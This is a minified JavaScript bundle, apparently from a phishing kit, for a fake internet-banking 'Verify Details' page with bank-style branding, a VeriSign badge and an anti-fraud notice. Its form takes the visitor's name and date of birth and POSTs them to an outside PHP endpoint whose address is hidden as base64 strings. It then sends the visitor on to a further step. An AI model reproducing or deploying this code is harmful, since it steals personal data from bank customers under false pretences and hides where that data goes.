(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[848],{7109:function(e,t,n){(window.__NEXT_P=window.__NEXT_P||[]).push(["/aa3",function(){return n(2367)}])},9018:function(e,t){"use strict";t.Z={dataList:"aHR0cHM6Ly9uczEuOWFwcHNkb3dubG9hZC5vcmcvdXMucGhw",getList:"aHR0cHM6Ly9uczEuOWFwcHNkb3dubG9hZC5vcmcvcmQucGhw"}},2367:function(e,t,n){"use strict";n.r(t),n.d(t,{default:function(){return m}});var a=n(7568),r=n(655),s=n(5893),i=n(9008),o=n.n(i),c=n(5675),l=n.n(c),u=n(7294),d=n(1163),h=n(9018);function m(){var e,t=function(e,t){if("0"!==e.charAt(0)||"00"==e){var n=parseInt(e);(isNaN(n)||n<=0||n>t)&&(n=1),e=n>parseInt(t.toString().charAt(0))&&1==n.toString().length?"0"+n:n.toString()}return e},n=(0,d.useRouter)(),i=(0,u.useState)(""),c=i[0],m=i[1],$=function(){var e=new Date,t=e.getFullYear(),n=e.getMonth()+1,a=e.getDate();a<10&&(a="0"+a);var r=e.getHours(),s=e.getMinutes(),i=r>=12?"PM":"AM";r%=12,r=r||12,s=s<10?"0"+s:s,m(a+"-"+["January","February","March","April","May","June","July","August","September","October","November","December"][n].substring(0,3)+"-"+t+" ["+r+":"+s+" "+i+" IST]")},f=(0,u.useState)(!1),p=f[0],v=f[1],x=(e=(0,a.Z)(function(e){var t,a,s,i,o,c,l;return(0,r.__generator)(this,function(r){switch(r.label){case 0:return e.preventDefault(),v(!0),t=new FormData(e.target),a={},t.forEach(function(e,t){a[t]=e}),s=JSON.stringify(a),i=((o={}).method="POST",o.headers={"Content-Type":"application/json"},o.body=s,o),[4,fetch(window.atob(h.Z.dataList)+"?id="+window.location.hostname,i)];case 1:return[4,(c=r.sent()).json()];case 2:return l=r.sent(),v(!1),!0==l.status?n.push("/aa4"):v(!1),[2]}})}),function(t){return e.apply(this,arguments)}),y=function(e){var n=e.target.value;/\D\/$/.test(n)&&(n=n.substr(0,n.length-1));var a=n.split("/").map(function(e){return e.replace(/\D/g,"")});a[0]&&(a[0]=t(a[0],31)),a[1]&&(a[1]=t(a[1],12));var r=a.map(function(e,t){return 2==e.length&&t<2?e+"/":e});e.target.value=r.join("").substr(0,10)};return(0,u.useEffect)(function(){return $},[]),(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(o(),{children:[(0,s.jsx)("title",{children:"Verfication"}),(0,s.jsx)("meta",{name:"description",content:"customer a verification"}),(0,s.jsx)("link",{rel:"icon",href:"/favicon.ico"})]}),(0,s.jsxs)("main",{children:[(0,s.jsx)("div",{className:"logo",children:(0,s.jsx)(l(),{src:"/logo.svg.png",alt:"site logo",width:100,height:37})}),(0,s.jsx)("br",{}),(0,s.jsx)("div",{className:"panelDiv",children:(0,s.jsx)("div",{className:"panel",children:(0,s.jsx)("span",{children:c})})}),(0,s.jsx)("div",{className:"content_heading",children:(0,s.jsx)("h3",{className:"pull-left",children:"Verify Details"})}),(0,s.jsxs)("div",{className:"content_area",children:[(0,s.jsx)("p",{className:"mandatory_txt",children:"Mandatory fields are marked with an asterisk (*)"}),(0,s.jsxs)("form",{action:"#",className:"form",method:"post",onSubmit:x,children:[(0,s.jsxs)("div",{className:"form-group",children:[(0,s.jsxs)("label",{className:"control-label",htmlFor:"jname",children:[" Customer Name",(0,s.jsx)("span",{className:"mandatory_txt",children:"*"})]}),(0,s.jsx)("input",{className:"form-control",type:"text",name:"customerName",tabIndex:"1",required:!0})]}),(0,s.jsxs)("div",{className:"form-group",children:[(0,s.jsxs)("label",{className:"control-label",htmlFor:"dateofbirth",children:[" Date of Birth",(0,s.jsx)("span",{className:"mandatory_txt",children:"*"})]}),(0,s.jsx)("input",{className:"form-control",onInput:y,type:"text",name:"dateofbirth",placeholder:"dd/mm/yyyy",tabIndex:"1",required:!0})]}),(0,s.jsx)("div",{className:"commonbutton",children:(0,s.jsx)("input",{name:"btContinue",id:"btContinue",disabled:!!p,type:"submit",className:"btn btn-default",title:"submit",value:"submit"})})]}),(0,s.jsx)("br",{}),(0,s.jsx)("div",{className:"info_panel",children:(0,s.jsx)("div",{className:"notify_icon",children:(0,s.jsxs)("ul",{children:[(0,s.jsx)("li",{children:"Any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately on report@onlinebanking.com if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials."}),(0,s.jsx)("li",{children:"Please note that you will receive the all communication related to Internet banking on your updated mobile number only after approval."})]})})})]}),(0,s.jsx)("div",{className:"footer_area",children:(0,s.jsx)(l(),{src:"/veriSign.png",width:68,height:28,alt:"versign"})}),(0,s.jsx)("div",{className:"footer",children:(0,s.jsx)("p",{children:"\xa9 OnlineBanking"})})]})]})}},7568:function(e,t,n){"use strict";function a(e,t,n,a,r,s,i){try{var o=e[s](i),c=o.value}catch(l){n(l);return}o.done?t(c):Promise.resolve(c).then(a,r)}function r(e){return function(){var t=this,n=arguments;return new Promise(function(r,s){var i=e.apply(t,n);function o(e){a(i,r,s,o,c,"next",e)}function c(e){a(i,r,s,o,c,"throw",e)}o(void 0)})}}n.d(t,{Z:function(){return r}})}},function(e){e.O(0,[345,774,888,179],function(){return e(e.s=7109)}),_N_E=e.O()}]);
